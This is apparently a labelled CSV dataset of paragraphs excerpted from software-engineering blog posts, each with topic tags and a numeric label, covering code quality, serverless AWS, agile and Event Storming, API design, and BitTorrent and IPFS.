1137,"Most internet communities for a given language establish some habits over time for how the language is written. It goes right down to the smallest syntax. Lower or upper case class names? A team must decide what is best for their needs. But the longer you deviate from what is most common in all examples, documentation and peoples habits, and the less consistent you are through the companys codebases, the longer it takes to work on the code.","['Software Development', 'Code', 'Code Quality', 'Team', 'Standardization']",9
1138,"Use a linter if you do not already, and keep discussions on what rules are in use and why! Code readability is linked to everything from syntax and comments, to architecture and naming of variables and features. Imagine reading a whole book where the whole text is written in a single continuous section? Thats how it is to read the code with low readability. Even for the developer who wrote it, long afterwards. Space and comments in code are as sections and chapters / headings in a book or article. Codebases tend to end up like spider webs. All parts are interrelated, and if anything happens, the entire network is affected. This has led to an ever increasing focus on building code as loosely coupled components. Clearly defined roles for each area of the architecture. Fixed patterns for how data structures are built up, processes, microservices, etc. Avoid the code base becoming a huge monolith where refactoring always involves high costs.","['Software Development', 'Code', 'Code Quality', 'Team', 'Standardization']",9
1139,"Twenty years ago, all the wheels had to be invented in all projects. Fortunately, this is not the case today. There are huge amounts of open-source libraries that try to simplify logic and resolve issues that occur frequently. Use whats in the community, and contribute yourself too. Or create your own open source module if you find something that you think others may need. It leads to more modular code, greater pretext for writing good tests, you contribute to the community, and becoming more visible as tech company.","['Software Development', 'Code', 'Code Quality', 'Team', 'Standardization']",12
1140,"It is important to think about how the logic and data flow in the code. Are things thrown back and forth in all directions? Do certain groups of logic and modules have responsibility for predefined steps? There are many patterns for programming architecture. Whether you follow a predefined pattern or not, this has a significant impact on code quality.","['Software Development', 'Code', 'Code Quality', 'Team', 'Standardization']",9
1141,"Programming is more than just structure and syntax. How you actually solve the individual task also has a big impact. No matter how much you try to keep the building blocks loosely connected, there will always be many dependencies back and forth. The way this is linked together has a great impact on usage and scalability. In this area there is experience that counts. One must have experienced and solved similar challenges earlier to know the advantages and disadvantages of different solutions and patterns. And not least, discuss solutions with colleagues! Share each others experiences and learn from what has been done on the project earlier. Give yourself room to rewrite where you consider it appropriate.","['Software Development', 'Code', 'Code Quality', 'Team', 'Standardization']",9
1142,"When you code, you are an architect in one form or another every single day. Not for anything that will stand still in the same place every day, but something dynamic, that will be a part of peoples habits. How often do the habits change? Its all too easy to just solve the problem you see there and then, without thinking about whether it could be built into a standard. A standard for this code base. A small standard that is followed in similar solutions and similar needs. The needs in technical architecture always repeats! Often with small variations, but look for patterns. Standardization is difficult, but probably the most important thing to increase code base quality! Standards must be able to change, but with higher threshold than other logic. This leads to reduced workload for all development, less maintenance and more satisfied developers! The most important focus is: do not let bad code become a habit! If you do not add cornices or fix the small hole in the wallpaper at home, you will get used to it and it will never be done. But people who are visiting will notice it. Do not let the weaknesses in the code reside. Can you live with good enough? But what cost does it bring over time, and what could you achieve if code quality was maintained at a higher level? Read also: Developers, measurability and motivation Techtive is about combining productivity, creativity and innovation while working with technology.","['Software Development', 'Code', 'Code Quality', 'Team', 'Standardization']",9
1143,"Using an all serverless architecture was what caught my attention with this project. Ive been following along the serverless revolution and Im a big fan. Before this project there were a few opportunities to lift services into lambda that I jumped at, but nothing on this scale. Being able to have an entire project hosted within AWS with no servers was fantastic. No server management, code runs when you need it to, its cheap and real easy to make modifications to (upload new versions). Although, as with every technology, it isnt without its pain points.","['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",10
1144,Setting standards at the beginning of the project is a big must. Its an easy trap to fall into when your spike code becomes production code and things are forgotten. A mistake we made when approaching this was not setting error response standards across the APIs from the beginning. We had multiple APIs being developed simultaneously and it was difficult to keep up with all the different error response formats. We ended up utilising the boom package. Once that was in place we had stable error responses and all the integrations were a lot smoother.,"['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",13
1145,ESlint is a great way to keep your project neat and tidy. We were targeting node 8.10 as thats what Lambda supported at the time with 2016 support. I recommend adding the additional experimental Object Rest Spread spread operator feature here. Its supported by 8.10 although ESlint will yell at you for using it otherwise. (The spread operator is amazing)Function lambdas that werent APIs were a great way of consuming and emitting events throughout the system. Small processes such as sending an email because x happened or completing a workflow because y notification came in were written and deployed in no time. In almost all cases it was just a handler function and a state machine with one purpose.,"['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",15
1146,"Another tenet we had was a strong focus on event driven architecture. All communication between services and actions was to be driven by events. We ended up using the pub/sub model of SNS and SQS combined, with events being published through SNS and passed onto lambdas using SQS. Ive spoken about this before and Im a big fan. For our use case this model worked well and without other systems to keep in sync we were fine with how the flow worked. Replay-ability wasnt a big priority for us so an eventstore wasnt needed.","['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",10
1147,"Each feature branch had its own stack built when commits were made, meaning each day it was common to have ~30 uniquely deployed stacks within AWS. This number doubled when the feature branch went into pull request and another merged branch was deployed. You might be thinking at this point, isnt that a LOT of infrastructure to have deployed? Doesnt AWS have hard limits too?","['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",10
1148,"A couple of weeks into the project, those limits were reached. In most cases the limit could be increased, but in others AWS had a hard limit. Parts that reached their limits: S3 Buckets API Gateways Lambda Functions IAM Roles + Policies User Pools Teardowns of the infrastructure were a massive problem, across all teams. The API gateway design was suboptimal, with 1 gateway per API, rather than all the APIs sitting under routes within the same gateway. We had a total of 7 API gateway instances per stack. Multiply that by the amount of stacks we had at once and you could exceed 200 API Gateways daily. This is a problem because an AWS account is restricted to deleting 1 API every 30 Seconds. Thats a lot of time to tear down only one type of resource we had.","['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",10
1149,"The entire project was within the same repository: The cloud system, the frontend and the QA testing suite. I am still strongly against this and believe that a separation of these systems goes a long way. Issues that arose between teams because of this: The frontend branches also had their own redundant AWS resource stacks (Where they actually just developed against the develop branch backend). This meant the frontend was heavily affected by build issues that were completely unrelated to their development.","['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",10
1150,The Build/CI platform we used was Travis CI. Im not a stranger to the tooling but it was new for the project. It was used with bash scripts running the whole process. The first issue was the bash environment in Travis has a very old version of npm installed. Users who were unfamiliar with the environment were a bit stumped when the node builds were taking decades. This can be manually updated but its not immediately obvious.,"['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",18
1151,"As part of our testing we needed to have automated end-to-end testing of vertical slices. Unfortunately we couldnt hammer 3rd party sandboxes 200 times a day with junk data. Our solution to this was to add a lambda API that took requests, first looking a file that reflected the route in s3: google/profile/get User Data.json. This file would have a json payload that could be updated to return any response you wanted to mock. Using this system we could return 200 OK and an expected payload or 400 bad request or even 200 with an unexpected payload.","['AWS', 'Node', 'Cognito', 'Serverless', 'IoT']",11
1152,Event Storming has caught me by surprise in the way how it boosts a projects startup and in the way the business can connect to it. I really enjoy the rare moment where a software development process really connects well to the business. It has a unique quality where it makes stakeholders and participants more equal. In a world dominated by technology and all these agile and Dev Ops processes that for most people are still out of this world its nice to been offered a tool to be connected. But what happens after the high of an Event Storming workshop? The result will help you to shape your software architecture into domains and it provides a vocabulary shared amongst all stakeholders. But I would argue we need this alignment with a process as well. I will show how Event Storming concepts can be intermixed in the agile process.,"['Eventstorming', 'Storymapping', 'Product Vision', 'Agile']",1
1153,"The TL;DR of why you want to intermix event storming in your agile toolset is to achieve the following benefits: The Event Storming map is not just a fancy brainstorm, it fuels all input Improved identification of (business) domain concepts from vision to stories Remove potential ambiguities in backlog management Improve traceability of vision and high level objectives to stories Before we can dive into the details of the flow. Lets consider the role of Event Storming in an agile context. In the past few years Event Storming has gained popularity from the software development community. It is a workshop format aimed at capturing requirements in a domain driven design architecture. What I consider one of its strengths is the focus on the business stakeholders and the high level interaction the workshop provides. Such a workshop can be performed at any stage in a software delivery lifecycle, but my focus is primarily early in the life cycle as a requirements gathering tool. If you not familiar to this technique, there are some recommended readings at the end of the article.","['Eventstorming', 'Storymapping', 'Product Vision', 'Agile']",1
1154,"Creating software requires a huge amount of effort, and context is key in getting the right value from the money spend. Any significant iteration of a new or existing project should start with the why question. A product vision board is a tool to capture the context of your undertaking on a high level. There are multiple formats, and depending on the situation it can make sense to pick one over another. A basic version is one from Roman Pichler. I will describe a basic example.","['Eventstorming', 'Storymapping', 'Product Vision', 'Agile']",12
1155,"Story mapping is a great workshop technique to collaboratively create a backlog. It allows to discuss the breadth and depth of the product. As depicted below, most people use the horizontal axis to highlight logical groupings in your software (themes, components, high level process steps. This is sometimes called the skeleton, it functions as the backbone of you story map. Capturing this these high-level themes is often the first challenge. Without any guidance this can be tough and will often require rework once you start to learn about the software. The vertical axis is used to determine the order in which you want this work to be part of your product. Works items (stories, epics, etc) get placed related to a vertical swim lane when it belongs to the column. And the height on the board will be determined by priority or logical dependencies. Once everything is plotted, the final step can be to identify the most valuable smallest possible releases as a horizontal slice.","['Eventstorming', 'Storymapping', 'Product Vision', 'Agile']",14
1156,"As mentioned before, getting the horizontal axis right is often very difficult. In regular story mapping (how most blogs prescribe it) I have learned it can make or break the conceptual picture of the system. People tend to use a conceptual model which is too low level, like a screen flow. I consider it a risk to focus the story map too much on solution properties. Things like screens, UX, or a process diagram will draw attention to the solution add hand. While designing towards a solution might look like something positive, its often too early to already have this solution in mind. This is a very important concept, so I will exemplify it. Lets consider the story map below. Chances are that the stories depicted in this board are on your backlog right now! The flow depicted above is painfully recognisable. Unfortunately plumbing gets the lead role in many design session. So lets take a step back. Your product vision will tell you why you want to build your product. The Event Storming workshop will tell you what the business looks like, and how to organise your software accordingly. In order to properly support the business with software, we should invent software which adds the most value! Its a collaborative workshop aimed at work preparation, and has a focus on delivering the most value in an early stage. All we need is a way to align this tool to the Event Storming. So lets use the creative aspect of story mapping, and use it to describe solutions.","['Eventstorming', 'Storymapping', 'Product Vision', 'Agile']",14
1157,"Component tagging or similar solution-focused tagging policies are cumbersome. You often start with a small list of components that everybody knows, and at that time it helps to divide the work in themes. Over time a teams attention switches to other parts of the software, and you will need to add new ones. However, the total list of components consists of lots of things that are not relevant for you at that point in time. Few people dare to delete it, and it will grow and grow. I have seen people copying the top part of the backlog to a new one to start from scratch. I have come to realise that a focus on DDD concepts as an organisational dimension offers a strong organisational dimension to the backlog. I will not argue to skip the old solution-driven components, they can easily coexist.","['Eventstorming', 'Storymapping', 'Product Vision', 'Agile']",19
1158,"So my new policy for organising a backlog is as follows. I take a slice from my story map and combine each story with the release for this slice. So stories that are related to epics, that exist in a certain release. On delivery of the horizontal slice, every epic should be closed. I assign the vertical axis (a DDD domain concept) as a component to both the epic and related stories. This way the business domain is represented and you introduced a timeless dimension to organise your stories.","['Eventstorming', 'Storymapping', 'Product Vision', 'Agile']",6
1159,"The implementation of On Start and On Stop overrides is straightforward based on the previous post: The created Trace Event Session is passed to the Clr Event Manager with the process ID with a filter to receive only Garbage Collection event notifications. The On Garbage Collection handler is super simple: Each garbage collection appears as a textual line with the following columns separated by a comma: The last twelve pieces of information require some explanation: xxx Before: size of a generation before the collection; without free list xxx After: size of a generation after the collection; without free list xxx Size: size of a generation (including LOH) after the collection; including free list (i.e. fragmentation)The computation of these sizes relies on inner fields of the Trace GC argument receives from Trace Event. The xxx Size are grouped in the Generation Size0/1/2/3 fields of the Heap Stat property. It is a little bit more complicated for the Before/After sizes. The Garbage Collector keeps track of these numbers in the Per Heap Histories field: an array of GCPer Heap History elements; one per heap (i.e. one per core for server GC). The next level is provided by the Gen Data field storing an array of GCPer Heap History Gen Data elements; one per generation with LOH as the last index 3. So, to compute the size of each generation, it is needed to iterate on each heap: The code of the Get Generation Sizes helper method does that sum the value of either Obj Space Before or Obj Size After.","['Software Development', 'Csharp', 'Dotnet Garbage Collection', 'Etw', 'Dotnet']",3
1160,"Agile is not the answer to all of your companys problems. Ive been a Scrum Master and Agile Coach for eight years now. Every single company Ive worked at said they were doing Agile. Part of the company was doing Agile. Software development teams were pulling work from a backlog, having daily standups, and planning work. Usually teams were making some effort toward continuous improvement and automation. They were trying to build relationships with business stakeholders.",['Agile'],12
1161,"But this does not mean the company as a whole is Agile. It also doesnt necessarily mean the company is effectively delivering business value to customers. Agile vs. waterfall isnt the issue, its communication across the organization. Silo busting is the key ingredient to successfully getting stuff done.",['Agile'],12
1162,"Lets forget all about the words Agile and waterfall for the moment. Lets forget altogether about styles of organizing work. Frameworks in and of themselves will not solve your companys problems. Thinking in terms of frameworks can be divisive and create walls. Lets get back to the basics of busting silos, the true killer of productivity. What are the basic components that an enterprise must have to be effective? The number one problem Ive seen across companies is the lack of a single, prioritized enterprise backlog.",['Agile'],12
1163,"If you dont establish a priority, people will make one up. The person or department that yells the loudest will get their work prioritized first, even if its not the next most important thing for the enterprise. Conflicts arise due to confusion about priorities. Business stakeholders get upset because their work isnt getting delivered. Teams are stretched thin trying to juggle 10 number ones at once.",['Agile'],1
1164,"It doesnt matter how your teams, departments, funding, products, and leadership hierarchy are organized. This will change (it always does). Your company needs one enterprise backlog. And the backlog needs to be published and communicated across the organization. Build and maintain the backlog in a single place, whether its a tool like JIRA or a wall of index cards. This is your companys single source of truth, its galvanizing force. Corporate IT is perpetually bogged down in meeting hell. Large groups of people spend tons of hours in meetings, all day long every day of the week. And yet the majority of the time, people say the meetings are a complete waste of time. Its because people are having discussions and making decisions in silos. The meetings feel and are wasteful because not all of the right people are in the room at the right time, and at the same time. This is usually because the people talking about and approving the work are not the same people who are actually going to do the work. The organizations response to this problem is to add meeting on top of meeting throughout the lifecycle of a project, never quite getting the right mix of people in the room.",['Agile'],0
1165,"Identify the core team from the onset. Include everyone in the conversation from the very beginning. Get hardcore about meetingsmake sure the right people are in the room, make sure everyone knows the expected outcomes, and hold people accountable. Take the leap and do big room planning (everyone required to complete a project from business sponsors and customers to marketing, development, and infrastructure teams) so theres no confusion about who is doing what when. Most places Ive worked have had multiple tools for tracking work: A project management tool A service desk (production support) tool A team work tracking tool A portfolio planning tool Excel spreadsheets Power Point slide decks Word documents Share Point sites Email Local desktops Shared drives Code repositories Test case management tools Companies spread critical information about work across all of these tools in a disconnected, jumbled mess. How can anyone effectively find the information they need? Clean up and reduce your tool stack. Pick one fully integrated application lifecycle management system and stick with it. Document something once, refer to it often. Adopt a fierce policy of storing information in one place, not lost in email, not in 10 different tools, spreadsheets, and documents. The magic is in people, not in tools. Stop getting nuts over shiny new tools and focus on removing information silos.",['Agile'],0
1166,"Sounds strange but above function can be replaced with lambda-function: Never do that in production code:)Modern python gives you simple intuitive syntax: But it also can be rewritten via: Btw, next variant is incorrect: Lets transform string x = 'tteesstt' to 'test'.compare a symbol with previous in original string:2. save previous symbol in temporary variable:3. compare a symbol with previous in new string:4. via reduce & lambda:save temporary values in list:2. save temporary values in dict:3. via reduce & lambda:4. the quickest variant:copy list:2. remove/replace any number of elements:3. add elements to begin of list:4. add elements to end of list:5. reverse list: Python prohibits to replace instance method, making it as read-only property: But it can be replaced on byte-code level: Note! It has influence not only to current instance but to class (if to be precise to function which is bound with class) and all other instances too: To assign mutable object as default value to function argument is very dangerous and there are a lot of tricky questions on interviews about that. But it can be helpful as cache mechanism.","['Python', 'Tricks', 'Magic', 'Code']",3
1167,"The common idea of new-wave protocols is the use of posets as an intermediate step in the process of finding the total order. Usually, new transactions (or transaction containers) are appended to the structure by referring to the hashes of some prior transactions, similar to Merkle trees. For the purpose of this article, well refer to such structures as Merkle posets. As such, various protocols use a different set of rules for transforming the intermediate structure into the chosen final ordering. How this connects with the happened-before relation is shown by the following remark: Proof: Since T_2>T_1, between their creation, the issuer of T_1 (say, process A) needed to pass the information about it (directly or indirectly) to the issuer of T_2 (process B). Hence, by definition, T_2 happened-before T_1.","['Blockchain', 'Distributed Ledgers', 'Aleph Zero', 'Directed Acyclic Graph', 'Cryptocurrency']",3
1168,"Therefore, every Merkle poset constructed by one of the new-wave protocols needs to be a subposet (not necessarily an induced one) of the happened-before poset. Then, each of the processes keeps its version of the Merkle poset and regularly synchronizes it with the others. The rationale behind using this data structure is that it allows the protocols to separate the two layers in which they can operate: In the first layer, processes add elements (for example, transactions) to the Merkle posets. Then a simpler wayfor example, a gossip protocolis used to synchronize their posets. This layer is pretty straightforward: processes are randomly connecting and exchanging information about new transactions. The trick is that the transactions are structured as Merkle posets so they retain some information about communication between processes on this layer. No safeguards against a double-spending attack are needed on this level, and transaction spamming is easily countered by small fees.","['Blockchain', 'Distributed Ledgers', 'Aleph Zero', 'Directed Acyclic Graph', 'Cryptocurrency']",3
1169,"In Aleph, we reduce the atomic broadcast (total order broadcast) problem to a binary agreement (BA) with a little twist. Achieving binary agreement, as the name suggests, is a fairly straightforward notion. To reach a binary agreement, processes need to agree on a single binary value. But what is the process of reducing ABC to BA? First, our Merkle poset is built from units that are containers for transactions and possibly other data. Units are divided into consecutive batches, and then each batch is ordered separately in a deterministic manner, and then batches are totally ordered by their indices. The rationale behind this is that after agreeing on the composition of a specific batch, it is very easy for all processes to compute the same orderingfor example, basing the order on a function involving the hashes of the units.","['Blockchain', 'Distributed Ledgers', 'Aleph Zero', 'Directed Acyclic Graph', 'Cryptocurrency']",3
1170,"Time, Clocks, and the Ordering of Events in a Distributed System.","['Blockchain', 'Distributed Ledgers', 'Aleph Zero', 'Directed Acyclic Graph', 'Cryptocurrency']",5
1171,"Containerization has gained a lot of attention recently and created various different projects around it. One category of these projects deals with container orchestration. Many different approaches have emerged, some cloud-only proprietary solutions such as Amazon ECS or, some open source ones like kubernetes. They all target the same, easier container orchestration. But will they really provide what they claim: easier management or simpler deployments? In this post, after I briefly talk about what containerization is, I will deploy an AI-API (an AI chatbot with a simple API) architecture using two different orchestration methods. One using kubernetes and one using nothing but a container-based manual controller plane.","['Software Development', 'Artificial Intelligence', 'Kubernetes', 'Science', 'Technology']",10
1172,"Conclusions In this experiment, I have tried to use an off-the-shelf container orchestration solution and a custom-made orchestration tool that I have written myself. Writing my own orchestration solution was fast. The concepts were not foreign and there were a lot of how-to articles. But when it came to kubernetes, it was a completely different story. To be able to use kubernetes, knowledge about containers is not enough, I had to learn new concepts and a new way of thinking (e.g., instead of containers, deployments and services as primary-citizens) to be able to use it for my purposes. But at the end, we can safely assume, using kubernetes for container orchestration made my structure safer and more stable, because most of the tricky parts of my software like maintaining a stable number of containers on hold, were done with the help of an open source project which is used and promoted by Google.","['Software Development', 'Artificial Intelligence', 'Kubernetes', 'Science', 'Technology']",10
1173,"Needless to say, this approach didnt scale and was not reliable. Each canary meant several hours spent staring at graphs and combing through logs. This made it difficult to deploy new builds more than once or twice a week. Visually comparing graphs made it difficult to see subtle differences between the canary and baseline. Our first attempt at automating canary analysis was a script that was very specific to the application it was measuring. We next attempted to generalize this process and introduced our first version of automated canary analysis more than 5 years ago. Kayenta is an evolution of this system and is based on lessons we have learned over the years of delivering rapid and reliable changes into production at Netflix.","['Automated Testing', 'Spinnaker', 'Software Development', 'DevOps']",6
1174,"If you ask a random project manager about their team, they will tell you that Quality Assurance and Developers work together in a symbiosis to achieve the best possible result. We put our differences aside in the name of the greater good, which is a bug-free, beautiful, sparkling clean product. However If you ask QAs they will tell you that Devs are snotty machines that are so far gone in the Matrix that they have reached rationality on a level that should not be reached. Programmers are the eternal evil who roam in the night and close our bugs as Cannot Reproduce even though we have just shown them how to trace them back step by step! On the other side, if you ask the Devs they will mumble out that QAs are doofuses whose sole purpose in life is to destroy their precious, pretty code. Programmers always whine that we are taking extreme measures just to crap all over their hard work. They will claim that we are imagining impossible scenarios to mess with their logic and are experiencing almost orgasmic pleasure when we discover a crash (which when I think about it might have happened once or twice).","['Quality Assurance', 'Development', 'App Development', 'Tech', 'Office Culture']",13
1175,"Test as there is a piece of delicious cheesecake for every major bug you find. Be curious, be stubborn and be very, very persistent. It is up to you to find them and show that passive aggressive douche-nugget that he needs you. Showing the Devs that they and their code have flaws and you are very aware of them will give you the upper hand and reduce the arrogance! Do not get insanely focused on minor issues! If all you contribute to the project is spill-outs, overlaps, missing pixels and tiny UI improvements, then perhaps switch profession to being an editor or something. As much as I like going to a Dev and giggling about his spelling mistakes, I also really want to destroy their stuff completely. I want to show them that I am not only a Shepard of missing commas and a Chaser of misalignment. I am also the Hulk who smashes and CRASHes (in a friendly manner) their puny code. If you bother them with minors all the time, they will just get frustrated with you and feel like youre wasting their potential. Challenge them by finding complicated and cool bugs. Show them that you have thought of a scenario which they have missed. Prove yourself valuable and they will trust you with their precious Git commits.","['Quality Assurance', 'Development', 'App Development', 'Tech', 'Office Culture']",13
1176,"As I said earlier, young Devs are lovely to work with. They are inexperienced and a bit uncertain about their skills. I have often had situations when I send them bugs and then they ask ME how I want the issues fixed? I was a bit stressed at first, because I thought that this is the job for a solutions architect or a project manager but then I started making decisions. Trust yourself and go with your gut. By now you have seen a lot of software and even if you dont realize it, you will be very good with explaining what the Expected Behaviour should be like. After all you have the renderings, the acceptance criteria, you have written the test cases, therefore you are perfectly prepared to tell them how you want the things to look like. Of course you should also know when the questions are above your knowledge and consult with other people if you are in doubt.","['Quality Assurance', 'Development', 'App Development', 'Tech', 'Office Culture']",13
1177,"The biggest compliment for me is when a developer refuses to release a feature without me checking it first. You should establish a trust that you have their backs. Yes, maybe you do make a happy savage howl when you find a crash but at the same time, you are their safety net in case they have made a mistake or forgot about a user scenario. You achieve this by being extremely curious, very inventive and creative with your testing. I have found out that programmers are usually very logical creatures and they follow strict rules. You should be their alogical alterego. Think in a way that they would not think and be able to come up with good negative scenarios.","['Quality Assurance', 'Development', 'App Development', 'Tech', 'Office Culture']",13
1178,"Structure can probably solve half the problems I mentioned above. Structure helps teams collaborate effectively by bringing clarity and prioritization on the following dimensions: Question: What is the question you are trying to answer? Issues: What are the main issues / hypothesis that are relevant to focus on to answer the question? Analysis: What is the analysis that should be conducted in order to identify approaches to address the issues / hypothesis? There are two useful frameworks that are incredibly useful to bring structure in a research context: This Mc Kinsey framework is a step-by-step problem-solving approach that applies logic rigorously to get from question to actionable recommendations. It is a framework I know by heart. If you looked into my DNA it might be there. Not only do all consultants at Mc Kinsey learn in their first week of training, but teams continue to refer to it in each client project. I hope to cover it in more detail another time. For now, you can learn how to go through the Seven Steps in this Mc Kinsey document.","['UX', 'Product Management', 'Research', 'Problem Solving', 'Change']",14
1179,"An issue tree is an approach to deconstruct a question into discrete addressable components. You might ask When do you create an Issue Tree? Typically in Step #2 in the Seven Steps mentioned above. If youre not using the Seven Steps, get in the habit of creating an Issue Tree any time you are trying to tackle a big question. You could go through the exercise on your own, or with a team. In my early days at Hub Spot, I went through several iterations of Issue Trees to try to wrap my head around big hairy challenges the Growth Team is trying to tackle.","['UX', 'Product Management', 'Research', 'Problem Solving', 'Change']",9
1180,"How powerful would it be to be able to:tell people where you are in a problem solving process? tell people your plan of attack?tell people why you arent addressing a question they want to have answered (push back)? This is what I mean by methods and sources: Methods: Qualitative (Ex. interviews, focus groups, ethnography), Quantitative (Ex. surveys, internal data, external reports)Sources: Primary data (Ex. market reports, expert interviews)In all the projects I recallwhether at Mc Kinsey or a startupwe used a multi-pronged approach to figure out an answer to a question. Heres why: Explore different approaches (methods and sources) depending on where you are in the problem solving process, as well as the accuracy and granularity of information you are looking for. For example, if you are looking to develop initial hypothesis on how to improve user engagement, it could be more appropriate to conduct a couple user interviews with a small sample before proceeding to do a fully blown-out survey or experiment. Carefully structured and planned out research can facilitate targeted learning along the way.","['UX', 'Product Management', 'Research', 'Problem Solving', 'Change']",0
1181,"Here are a few tips on developing recommendations and leading implementation: The Pyramid Principle is an incredibly useful framework for effective visual and verbal communication. Start with the conclusion first, then make sure the building blocks are there to support the overarching message. A simple way to do this is by making sure the hierarchy is maintained in the structure of your powerpoint slides or written documents visually. In the case of powerpoint, apply the rule of thumb one-slide, one message, to make sure everything builds up to the message in the slide heading. If youve structured your documents following the Pyramid Principle, the delivery should be straightforward. All you have to do is read from top-to-bottom, from one-slide to the next.","['UX', 'Product Management', 'Research', 'Problem Solving', 'Change']",14
1182,"Lastly, this is more of a tip on how to deliver your findings and recommendations. While researchers can lean on data to substantiate their claims, I also think that conviction is a very important attribute for leaders who want to drive change. The fear associated with the uncertainty can be a key barrier to for teams who consider change. However, leaders with conviction can help their teams overcome uncertainty and enable them to focus on implementing the best course of action. During my time at Happie, I recommended changes to the way the tech-enabled service operated and the design of the internal-facing product. When I made the recommendations, I not only packaged the data to support my claims, but tried to make sure my message to the executive team was delivered with conviction.","['UX', 'Product Management', 'Research', 'Problem Solving', 'Change']",0
1183,"As a former recruiter, educator and software engineer Ive had a lot of conversations with people learning to code. Oftentimes its surprising to talk to aspiring engineers that are learning advanced concepts and technologies with only a few months of programming under your belt. For many, the path goes through learning fundamentals like HTML, CSS and Javascript. After mastering the basics many aspiring engineers will dive deeper into object oriented Javascript, ES6 and React.js. From there they may dive deeper into the N __url__ ecosystem and drill down interview practice questions. Theres nothing wrong with this career path. You can build almost anything with Javascript and many people have landed incredible jobs this way. In this post Id like to offer up some alternative technologies you can learn in conjunction with or instead of React.js.",['Serverless'],2
1184,Resources for learning: Object Oriented Bootcamp (Laracasts)PHP: The Right Way Wordpress. More sites run Wordpress than any other web platform. You can build sites for clients that are easy for them to update and maintain or build custom themes and sell them throughout the world. Wordpress is definitely a technology worth looking into if you are learning to code.,['Serverless'],19
1185,"Resources for learning: Shopify Partners Fundamentals of Shopify Theme Development (Shopify Partners)This one is not for the faint of heart. The AWS ecosystem is massive and constantly changing. Amazon builds services on top of services and it can be hard to keep up. Although startups that scale need a cloud infrastructure provider. Amazon invented this space and is followed closely by Google and Microsoft. I recommend checking out AWS Lambda and Serverless for the sole reason that its new, hot and can drastically reduce costs for businesses.",['Serverless'],19
1186,"Whats the Status?200 is Good, and 500 is Bad. Without consistent HTTP status codes, your customers will not know the difference between success or failure without parsing the response body. Use a few status codes well, and they will appreciate it.","['API', 'Design', 'Web', 'Web Apis', 'Software Development']",19
1187,"Mini MIMEIf there is neither support for multiple MIME types for I/O, nor use of standard header parameters, then it decreases your API audience and chances of success. Support JSON for I/O as a must and minimum; consider CSV as a go-to for data integration with external, legacy systems, and contemplate XML as an optional I/O format.2. No Versioning Things change, and so will your API. If you do not do this, then your customers will at the least, hate you and wish terrible things to befall you when the API is updated without backwards compatibility and at worst, consider switching to alternatives. There are different versioning approaches ranging from URI to request query/header parameters; understand the tradeoffs and choose one. Just pick one and stick with it. As an aside, I do prefer the URI (e.g. api/v1/My Resource) because it makes it clear to the customer what version is being used.3. No Documentation Whether the documentation is a simple wiki with how tos and examples (try mkdocs), an interactive API browser based on Swagger or RAML attributes decorating your endpoints, or a combination of both (better), your direct customers are developers and you should assist them in learning and using your services.0-to-60: Developers should be able to get from 0-to-60 and beyond Hello World as soon as possible; include quick start tutorials and fast 123 signups to streamline this process.","['API', 'Design', 'Web', 'Web Apis', 'Software Development']",19
1188,"Drink ACID at your own Risk: Do you really need consistency and serializability? What other data constraints can you relax?6. No Logs Monitor and log API activity across multiple nodes. Without good logs, its difficult to troubleshoot, plan for capacity changes, and follow up with customers regarding their usage. Start with text-based log files readable by man and machine. Consolidate the files for service-wide reporting using UNIX syslog or file watchers. Consider streaming the logs real-time into a dedicated service (e.g. Azure Application Insights, Amazon Cloud Watch, Splunk, Elasticsearch).7. Not Fair If you dont have the ability to throttle customers, then you are vulnerable to Denial of Service attacks and will not be able to fairly service most other customers.","['API', 'Design', 'Web', 'Web Apis', 'Software Development']",11
1189,"Both AWS and Azure also offer world-class API gateway management services with similar feature sets. Measure first, set conservative limits as a start, publish the limits to customers on the API wiki, monitor usage, and manage traffic rate limits flexibly based on your infrastructure capacity (supply) and customer needs (demand).8. No Customer Service Its all about keeping customers happy in the end. Fix bugs and implement features fast; deliver them to Production faster. Publish release notes of past changes and the future roadmap. Facilitate online chat forums where you can help them, and they can also help each other. Schedule meetings with the most important stakeholders on regular basis. Send your customers surveys,and ask good questions about what they like/dislike and what they want to see going forward.","['API', 'Design', 'Web', 'Web Apis', 'Software Development']",10
1190,"In order to capture the real-time nature of collaboration, weve chosen to update the scores on each event. Every time a user interacts with a file, that entry in the user vector changes, and that users relationship with every other user also changes. Because of the number of users Box customers have, that amount of per-event computation is not feasible. Instead, on each event, we come up with an approximation by updating the user-user scores for only a subset of the other users. Since most users have a very weak relationship to almost all other users, by judiciously choosing which scores to update, the result is a pretty good approximation of the full update. We store log value of the numerator and denominator of cosine similarity, and with few math simplifications we can incrementally update.","['Data Science', 'Machine Learning', 'Content Management', 'Cloud', 'Cloud Storage']",14
1191,"To be very meta, you can check out Bit Torrent on Github Bit Torrent: Peer to Peer Filesharing Unfortunately, Bit Torrent has received quite a bit of infamy as a medium for the sharing of copywrit material. However, the protocol itself was designed as an efficient peer to peer filesharing method. In Bit Torrent, files are broken down into small, easy-to-share pieces. Each piece is given a unique identifier, called a hash. Hashes are computed from the content of the file in such a way that only two identical files share the same hash. This way it is immediately obvious if a piece of data has been corrupted or tampered withjust check if the hash of the data you receive is the same as the hash you requested. This provides a unique, global identifier for that piece of information. When you want to download a torrent, you collect the hashes of all pieces of data that you need, usually from a trusted entity called a Bit Torrent tracker. You then broadcast these hashes to the Bit Torrent network. Peers who have the data corresponding to that hash will then send it to you. You can then verify that the data received matches the hash, put all the pieces together, and vola!","['Ipfs', 'Web3']",7
1192,"Git: Version Control Software Version control software allows you to go back in time when editing a file. This is done by means of committing changes to files. You can open a text document, make some changes, and then commit those changes. Or you can create some new files, delete some unneeded ones, and edit a few here and there before committing. Git never forgets these commits, so you can always go back to a previous one. Think of it as being able to press Ctl+Z on an entire directory of files.","['Ipfs', 'Web3']",18
1193,"In the current model, you type a human-readable address into your browser. That address is then converted into an IP address, which is a unique address assigned to a computer on the internet that you want to connect to. You then establish a connection with that computer and request any desired data. In the new model, you dont type in the address of the computer you want to connect to, but instead you provide the address of the data itself. Then anyone who is connected to you and has that data can provide it. If none of your peers have the data, they can re-broadcast the request to their peers, and so on.","['Ipfs', 'Web3']",11
